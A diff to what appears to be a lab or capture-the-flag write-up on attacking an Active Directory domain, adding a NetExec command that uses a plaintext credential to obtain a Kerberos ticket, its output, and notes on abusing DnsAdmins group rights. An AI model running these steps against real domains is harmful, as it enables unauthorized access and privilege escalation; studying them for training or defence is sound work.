@@ -650,7 +650,17 @@ This includes the dnsadmins group, which is what i will abuse in this instance
 So since i have GenericAll over the group itslelf i first have to add my user to the group!
 
 ```python
+nxc smb dc01.fragments.local -u sharedadmin -p 'Password123!' --smb-timeout 5 -k --generate-tgt sharedadmin
+SMB         dc01.fragments.local 445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:fragments.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         dc01.fragments.local 445    DC01             [+] fragments.local\sharedadmin:Password123! 
+SMB         dc01.fragments.local 445    DC01             [+] TGT saved to: sharedadmin.ccache
+SMB         dc01.fragments.local 445    DC01             [+] Run the following command to use the TGT: export KRB5CCNAME=sharedadmin.ccache
+```
 
+Since im using kerberos becuase of the limitations of the protected users ill start by generating a TGT
+
+```python
+export KRB5CCNAME=sharedadmin.ccache
 ```
 
 
